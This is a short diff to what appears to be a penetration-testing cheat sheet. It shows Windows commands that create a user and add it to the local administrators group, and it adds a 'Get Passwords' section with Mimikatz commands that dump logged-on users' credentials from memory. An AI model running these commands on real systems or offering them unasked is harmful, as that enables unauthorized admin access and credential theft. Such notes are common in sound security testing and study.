@@ -20,3 +20,11 @@ Add new user and add to local admin group
 > net user gary password /add
 
 > net localgroup administrators gary /add
+
+
+
+## Get Passwords
+
+> privilege::debug
+
+> sekurlsa::logonpasswords
